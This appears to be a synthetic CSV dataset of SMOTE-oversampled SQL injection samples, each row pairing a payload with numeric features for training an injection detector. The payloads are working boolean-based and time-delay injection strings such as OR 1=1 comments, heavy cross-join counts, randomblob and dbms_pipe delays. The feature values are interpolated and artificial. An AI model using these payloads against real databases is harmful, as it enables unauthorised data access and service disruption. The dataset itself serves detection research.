id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000310,attack,boolean,"select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 and    (    (   'ootz' like 'ootz",nearest_attack_euclidean,R000217,1.0242869243308064,130.01795881933282,28.491020590333587,4.008979492313808,81.79040734349886,3.4910205903335854,30.754489704833208,13.98204118066717,0.6287813200200993,0.026944149839255957,0.23653792317928907,0.10773660696135556,3.0,1.1102230246251565e-16,0.0,0.0,1.0,0.0,0.0,4.0,0.0,1.2275514758339638,2.4910205903335854,1.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000311,attack,boolean,"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and    (    (   ""swec"" like ""swec",nearest_attack_euclidean,R000088,0.1833498197252748,125.61138014361515,28.115718321365403,4.016852818049672,75.0,5.0,28.842816786345956,16.76856335726919,0.5976820602005384,0.03984547068003591,0.2290103613527889,0.13346210776663675,0.0,3.0,0.0,0.0,1.0,0.0,0.0,3.7685633572691914,0.0,5.0,4.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000312,attack,boolean,"select dbms_pipe.receive_message  (  chr  (  66  )  ||chr  (  67  )  ||chr  (  79  )  ||chr  (  101  )  ,5  )   from dual and 'hvqt'  =  'hvqt",nearest_attack_euclidean,R000213,0.6743630297073409,142.8308903695107,35.0,4.053485673400605,59.553926913007146,10.0,49.27696345650357,24.0,0.4169030781236145,0.0700271743578651,0.3450045290596442,0.16806521845887623,3.0,1.1102230246251565e-16,0.0,0.0,0.0,0.8615182717482144,0.0,10.138481728251785,0.0,2.0,1.0,6.861518271748214,1.0,0.0,0.0,0.0,0.0,0.8615182717482144,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000313,attack,boolean,"1' or 7552  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )   and 'ynpr'  =  'ynpr",nearest_attack_euclidean,R000060,0.3711818461365635,150.45112869218605,30.8774435653907,4.198549512982919,82.4902257384372,8.877443565390697,40.960902953748835,18.1225564346093,0.548888387086931,0.05919407534781808,0.2713408791087344,0.12057665845651658,4.0,1.1102230246251565e-16,0.0,0.0,1.0,1.8774435653906976,0.0,4.49022573843721,0.0,0.0,2.877443565390698,2.8774435653906973,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000314,attack,boolean,"-7923""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""szct""  =  ""szct",nearest_attack_euclidean,R000258,1.0294504061667777,96.27083105993844,28.576389646687183,3.535429311030004,22.10185286224958,16.0,42.745367844376055,15.423610353312817,0.23104504066814874,0.1665590511236531,0.44256158646200344,0.1598343217461947,0.0,4.0,1.0,0.0,0.0,1.4745367844376058,0.0,6.949073568875211,0.0,1.0,1.0,2.4745367844376056,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000315,attack,boolean,"1   )    )     )   or 2367  =    (  select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4  )  --",nearest_attack_euclidean,R000159,0.6345908759688991,142.92525652241372,31.414948695517253,4.06521895016381,71.0,9.0,44.925256522413726,18.0,0.49718042334143675,0.06302287056440749,0.3137509649653407,0.12604574112881495,0.0,0.2074743477586276,2.0,0.0,1.0,1.0,0.0,6.585051304482745,0.2074743477586276,0.0,3.0,4.0,0.0,0.2074743477586276,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000316,attack,boolean,select * from users where id  =  1 +   (  $+  )   or 1  =  1 -- 1,nearest_attack_euclidean,R000007,0.16134052239222474,65.0,23.329814921017967,3.4364161100595623,24.0,4.0,27.0,10.0,0.36923076923076925,0.06153846153846154,0.4153846153846154,0.15384615384615385,0.0,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,2.0,0.0,0.0,0.0,6.670185078982034,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000317,attack,boolean,"1"" and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000210,0.6133776454666242,105.0,33.16487478781822,3.794848311910811,31.83512521218178,15.0,42.0,16.16487478781822,0.3031916686874455,0.14285714285714285,0.4,0.15395118845541164,2.164874787818222,0.835125212181778,2.0,1.0,0.0,1.0,0.0,8.0,0.16487478781822212,0.0,1.0,4.0,1.0,0.8351252121817779,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8351252121817779,0.16487478781822212,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000318,attack,boolean,"-9749"" where 7083  =  7083 or make_set  (  7577  =  1182,1182  )  --",nearest_attack_euclidean,R000153,0.009293987486097985,68.09141672085018,27.0,3.9880561939148187,14.027425016255055,24.0,20.05485003251011,10.009141672085018,0.20598012483513384,0.35257453186824794,0.29443540571418514,0.14700993758243305,0.0,1.0,3.0,0.0,0.0,2.0,0.0,2.0091416720850184,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000319,attack,boolean,"-1084 where 1181  =  1181 or make_set  (  9354  =  9354,7185  )  --",nearest_attack_euclidean,R000112,0.22353006692904345,69.36177856382096,25.181675274140076,3.847323889389247,15.090051644840443,24.0,21.090051644840447,9.181675274140073,0.21641204483410753,0.34763382732617476,0.3033205016656512,0.13263362617406646,0.0,1.1102230246251565e-16,3.0,0.0,0.0,2.0,0.0,2.1816752741400744,0.0,1.0,1.0,5.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000320,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and    (    (     (  'pnst'  =  'pnst",nearest_attack_euclidean,R000233,0.8026563749662403,123.07114831919021,27.821475280134965,3.978431665063752,69.71409887946014,5.05368820033741,34.53557415959511,13.767787079797554,0.5662184017557929,0.04213757035867577,0.2800997443843033,0.11154428350122803,2.1785247198650364,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,4.589262359932518,0.0,0.0,2.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000321,attack,boolean,"1""   )    )    as sqzh where 5672  =  5672 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000309,1.4833853401714845,161.0,32.512076771945246,4.051799104401937,74.0,18.0,48.0,21.0,0.45962732919254656,0.11180124223602485,0.2981366459627329,0.13043478260869565,0.48792322805475097,0.512076771945249,2.0,0.0,1.0,2.0,0.0,6.0,0.0,5.0,4.0,5.0,0.48792322805475097,0.512076771945249,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000322,attack,boolean,"-4641""  )   where 4212  =  4212 or make_set  (  3595  =  4062,4062  )  --",nearest_attack_euclidean,R000049,0.028948161316889605,73.0,26.0,3.8043240650613113,13.999999999999996,24.0,24.0,11.0,0.1917808219178082,0.3287671232876712,0.3287671232876712,0.1506849315068493,0.0,1.0,3.0,0.0,0.0,2.0,0.0,3.0,0.0,1.0,1.0,5.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000323,attack,boolean,"1%""   )    )     )   or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000243,0.1111080472728485,151.0,33.97256002082107,3.3174041727506705,34.0,15.0,76.0,26.0,0.2251655629139073,0.09933774834437085,0.5033112582781457,0.17218543046357615,2.109759916715717,3.8902400832842825,0.0,1.0,0.0,2.0,0.0,14.0,1.9999999999999998,0.0,1.0,3.0,1.0,0.972560020821071,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000324,attack,boolean,"1  )   where 5333  =  5333 or 9643  =    (  select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3  )  --",nearest_attack_euclidean,R000297,0.7988132584829498,139.52796182098913,32.0,4.167106499789159,69.0,16.0,39.527961820989134,15.0,0.494619797812898,0.11469444586965749,0.2831597133146406,0.10752604300280391,0.3680095447527165,1.1102230246251565e-16,2.0,0.0,1.0,2.0,0.0,4.6319904552472835,0.0,0.0,2.0,5.0,0.3680095447527165,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000325,attack,boolean,"1%""   )    )     )   and 8312  =  dbms_pipe.receive_message  (  chr  (  69  )  ||chr  (  79  )  ||chr  (  101  )  ||chr  (  68  )  ,5  )  --",nearest_attack_euclidean,R000267,0.0996250610408291,139.14698514595182,34.0,3.6764340435694804,37.0,15.0,59.317588116761456,27.829397029190364,0.26595563754496204,0.10781985305876839,0.42622450939626955,0.2,0.0,1.0,2.0,0.0,0.0,1.0,0.0,12.829397029190364,1.0,2.0,1.0,9.0,0.0,1.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000326,attack,boolean,"1  )   or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",nearest_attack_euclidean,R000044,1.1218338021334595,107.00715577897387,33.0,3.705775398638235,31.33094807367538,15.0,44.67620770529848,16.0,0.29290304786673294,0.1402021748955372,0.41734579068249017,0.1495489865552397,2.0,0.33094807367538004,2.0,1.0,0.0,1.0,0.0,8.66905192632462,0.0,0.0,1.0,4.0,1.0,0.33094807367538,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.33094807367537993,0.66905192632462,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0
SMOTE_000327,attack,boolean,"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",nearest_attack_euclidean,R000033,0.34153181884332984,92.24758616597305,21.73039787168816,3.1512454117342514,20.595596807532242,13.0,44.92159148675264,13.730397871688162,0.22324491599981566,0.14128991067012747,0.48663522933017966,0.14882994399987712,4.0,1.1102230246251565e-16,0.0,0.0,0.13480106415591975,1.0,0.0,7.730397871688161,0.0,0.0,0.8651989358440804,1.1348010641559196,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000328,attack,boolean,"1'   )    )    and make_set  (  8245  =  9872,9872  )   and    (    (   'kzgt'  =  'kzgt",nearest_attack_euclidean,R000021,0.8322632814274797,81.55167448855916,24.0,3.516809170553309,21.0,13.0,34.47286384733643,13.078810641222738,0.2594310251443884,0.16060015842271666,0.41946330451831065,0.16050551191458426,4.0,1.1102230246251565e-16,0.0,0.0,0.0,2.0,0.0,5.078810641222738,0.0,1.0,1.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000329,attack,boolean,"select count  (  *  )   from domain.domains as t1,domain.columns as t2,domain.tables as t3 and   (  'atyf'  =  'atyf",nearest_attack_euclidean,R000236,0.06921091656182378,116.35935023103043,27.154007241870183,4.100300116157671,73.35935023103042,3.051335747290061,26.89732850541988,13.05133574729006,0.630393331926991,0.026203875525130066,0.23124387793600254,0.11215891461187633,3.0,1.1102230246251565e-16,0.0,0.0,1.0,1.0,0.0,2.9486642527099383,0.0,0.0,2.0513357472900613,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000330,attack,boolean,1'   )    )     )   and 4069  =  8786 and    (    (     (  'eftr'  =  'eftr,nearest_attack_euclidean,R000253,0.767176635472182,79.5812515560659,19.0,2.8879657926070923,13.999999999999996,10.221667081617571,42.44333416323514,12.91625031121318,0.1771648115874189,0.12746574327655183,0.5333333333333333,0.16203611180269595,4.0,1.1102230246251565e-16,0.0,0.0,0.305416770404393,2.0,0.0,6.610833540808787,0.0,0.0,0.0,2.3054167704043933,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000331,attack,boolean,"-2314""   )    )    or make_set  (  9354  =  9354,7185  )   and    (    (   ""uatq"" like ""uatq",nearest_attack_euclidean,R000208,0.0024656479065040563,92.0,30.0,3.7125007909113,24.0,16.0,38.0,14.0,0.2608695652173913,0.17391304347826086,0.41304347826086957,0.15217391304347827,0.0,4.0,1.0,0.0,0.0,1.0,0.0,6.0,0.0,1.0,1.0,2.0,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000332,attack,boolean,"1%' and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and '%'  =  '",nearest_attack_euclidean,R000287,0.32115697206716276,139.55796147050685,30.0,4.028558966767708,75.77898073525343,8.0,37.77898073525342,18.0,0.5430384072641143,0.05738454301881919,0.2704618279247233,0.12911522179234317,4.0,1.1102230246251565e-16,0.0,0.0,1.0,2.0,0.0,4.194745183813356,1.8052548161866444,0.0,2.0,3.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_000333,attack,boolean,"1%' or 5286  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )   and '%'  =  '",nearest_attack_euclidean,R000078,1.8844953634793637,120.46937282203972,28.036105601695365,4.0279350053257055,64.03610560169537,7.590264004238407,29.252739211867542,19.590264004238406,0.5369470038361956,0.06147223556625052,0.23931676576382216,0.16226399483373158,3.5180528008476815,1.1102230246251565e-16,0.0,0.0,1.0,1.5180528008476815,0.0,3.0361056016953634,1.5180528008476815,5.0,4.0,2.5180528008476815,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.5180528008476816,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.5180528008476815
SMOTE_000334,attack,boolean,"-5637%""   )    )     )   or 6872  =  6872 and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000066,2.9009841111501515,70.45700733729453,13.859077193588552,2.264512809935817,4.532643381235324,8.522294099765167,42.80413971258806,14.59793014370597,0.06426066865979119,0.1106791441527944,0.6179423756704803,0.2071178115169341,0.0,4.0,0.5326433812353231,0.0,0.532643381235323,1.5326433812353228,0.0,6.934713237529354,1.065286762470646,0.0,0.0,2.5979301437059688,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5326433812353228,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.532643381235323
SMOTE_000335,attack,boolean,-8056   )    )    as botl where 9225  =  9225 or   (  1182  =  7641  )  *7641--,nearest_attack_euclidean,R000182,1.133656924236971,79.4827761755198,23.55167147344059,3.5230705378186706,13.0,24.0,32.0,10.482776175519803,0.16356390976554472,0.301964141105621,0.40261885480749465,0.13185309432133965,0.0,0.48277617551980384,3.0,0.0,1.0,2.0,0.0,4.0,0.0,0.0,0.0,6.0,0.0,0.4827761755198038,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000336,attack,boolean,1  )   as azoo where 8933  =  8933 and   (  3020  =  3020  )  *6703--,nearest_attack_euclidean,R000070,0.6359866258211243,67.61389556766511,24.0,3.6040349852675777,13.16833734059907,21.0,25.445558227066048,8.0,0.19429817449140044,0.31093935531680994,0.3763093824520526,0.1184530877397371,0.0,1.1102230246251565e-16,2.0,0.0,0.7227791135330242,2.0,0.0,3.0,0.0,0.0,0.27722088646697585,4.722779113533024,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000337,attack,boolean,"1%'  )   or 1022  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",nearest_attack_euclidean,R000218,0.5023949325574218,127.15234771958887,28.32924220559682,3.956721182575005,62.16462110279841,10.0,34.98772661679046,20.0,0.48903787446819963,0.0786774390025129,0.27492980852426163,0.15735487800502582,1.0,1.1102230246251565e-16,2.0,0.0,1.0,1.0,0.0,5.16462110279841,0.8353788972015899,5.0,4.0,4.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.16462110279841002,0.8353788972015899,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_000338,attack,boolean,"1'||  (  select 'lije' from dual where 5309  =  5309 and 3202  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )     )  ||'",nearest_attack_euclidean,R000069,2.1459283516145846,163.0164076003655,35.1934369598538,4.072792775385697,65.08203800182756,20.177029359488284,54.56390327919587,23.193436959853795,0.3982004677196039,0.12411600509126719,0.3352847556510129,0.14239877153811603,5.193436959853796,1.1102230246251565e-16,0.0,0.5967184799268976,0.40328152007310236,2.0,0.0,8.38687391970759,0.0,0.0,1.4032815200731024,7.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.4032815200731021,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.403281520073103
SMOTE_000339,attack,boolean,"1'   )    )     )   and elt  (  9041  =  6421,6421  )   and    (    (     (  'ixxg' like 'ixxg",nearest_attack_euclidean,R000033,0.5712934566727046,91.06866973580114,21.549026113200178,3.148950525944568,20.323539169800263,13.0,44.196104452800704,13.549026113200176,0.22313772228912537,0.14330277034864528,0.4848010258361457,0.1487584815260836,4.0,1.1102230246251565e-16,0.0,0.0,0.22548694339991204,1.0,0.0,7.549026113200176,0.0,0.0,0.7745130566000878,1.225486943399912,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_000340,attack,boolean,"1'  )   and make_set  (  8403  =  8403,8899  )   and   (  'dhoo' like 'dhoo",nearest_attack_euclidean,R000155,0.3903664455198933,73.9016614219185,24.313538388699065,3.752718773104598,24.03895374417869,13.0,26.0,10.862707677739813,0.32445373040108244,0.1761748062716536,0.35234961254330727,0.1470218507839567,4.0,1.1102230246251565e-16,0.0,0.0,0.13729232226018667,1.0,0.0,4.0,0.0,0.8627076777398133,0.8627076777398133,1.1372923222601865,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
